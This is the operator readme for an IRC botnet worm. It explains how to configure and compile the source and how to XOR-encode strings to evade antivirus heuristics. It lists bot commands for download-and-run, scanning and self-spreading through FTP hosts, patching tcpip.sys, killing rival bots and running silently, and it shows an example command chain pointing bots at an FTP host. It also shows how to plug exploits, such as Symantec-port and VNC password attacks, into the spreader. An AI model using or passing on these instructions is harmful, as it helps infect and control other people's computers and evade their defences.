1. Preparations before compiling
--------------------------------

You need to edit most *.cpp files. Usually editable area is marked with
"config here" when it starts and "config ends" when it ends. MD5 can be
now decided whether to use or not (only for download and remove commands!).
The main file where you set defines is shared.h. There you can enable
DEBUG mode and optional addons such as botkiller, tcpip.sys patcher, md5
and exploits. I recommend you to change all strings too (most AVs target
strings for heuristic points). Change encoded strings with XOR tool, non
encoded strings just change text (note for FTPD: don't change starting
numbers!)


2. Using XOR encoder
--------------------

xor.exe is a command line program that can out of one file generate strings.h
file, where encoded strings are then located. 

Check strings.cfg and encoded strings in *.cpp files for example and compare 
them.
*Note1: always save old encoded strings before making new one
*Note2: always use complement option on
*Note3: you also have to change decode key, which is located in shared.cpp in
config area

If your bot isn't working anymore, after you change strings (either
doesn't connect to irc or doesnt run after reboot), you have fucked up
something with strings.


3. Bot commands
---------------

Standard non-protected commands (assuming prefix = !):
() == needed parameter, [] == optional parameter

!v			bot version
!d			disconnect
!r			reconnect to same server
!q 			reconnect to next server
!ss			stop scanning
!gc			get current cftp settings
!sc (host) (port) (user) (pass) (file)	
			change cftp settings
!rm			remove*
!dl (mode) (url) [dest] download*

url = the url has to start with http:// (currently the only supported method
      for downloading)
mode = 0 - just download
       1 - download and run
       2 - update
dest = optional destination file (if null, the file is downloaded to temp dir)

*these commands can be MD5 hashed for security

Optional:
!patch			patch win xp sp2 tcpip.sys
!bk (x)			start botkiller, repeat every x minutes 
			(if x == off, bk is turned off)

Scanning command:
!s (threads) (ip/b/y) (rand/seq) (transfer mode) [lanbots range]

threads = number of threads (recommended 64, not go over 96)
ip/a/b/c/y = put in IP to start scan from or b for C&D IP range scanning (own)
	     or y for B random IP range scanning (own), a for B&C&D range scanning,
	     c for D range scanning
rand/seq = 1 means random, 0 means sequential scanning
transfer mode = 0 - all bots use ftp
		1 - lan bots use cftp, wan bots use ftp
		2 - all use cftp
lanbots range = range for lanbots to scan (so they dont
		scan lan ranges which are mostly empty)

Recomendations: I recommend you to use cftp for lan bots and reach much higher
spread rate (usually with other bots, lan bots are there just for jack). But be
careful, when using vnc rooting and cftp, location of your exe can be easily
obtained by masters of pcs you are rooting!

How to turn silent mode?

!sm on		turn silent on on main channel
!sm off		turn silent off on main channel
!sa on		turn silent on on all channels
!sa off		turn silent off on all channels

The bot also supports multiple commands. Example:
!sm on !patch !sc ftp.givemeyourdick.com 21 lala bleh asdf.exe !scan 64 b 0 1

Note: you can put such command to topic and when bot joins, it will excecute
all commands.


4. Adding exploits
------------------

Adding exploits is much simpler in this bot. You need to add .cpp and .h file
to the project. Next step is to add #include "myexploit.h" into spreader.cpp.
Then search for function "DWORD WINAPI Spreader_Thread(LPVOID param)" in
spreader.cpp; you see the following struct filled:

	port_s p[] = {
#ifndef NO_SYM
		{ 2967, FALSE, SYMExploit },
		{ 2968, FALSE, SYMExploit },
#endif
#ifndef NO_VNC
		{ 5900, FALSE, VNCPassCheck },
#endif
		{ 0, FALSE, NULL}
	};

Put in line for your exploit (above the last NULL exploit):
	
		{ 1337, FALSE, MyExploit },

First parameter is port for your exploit, second one has to be FALSE and third
one is the function name thats being called if the port is opened.
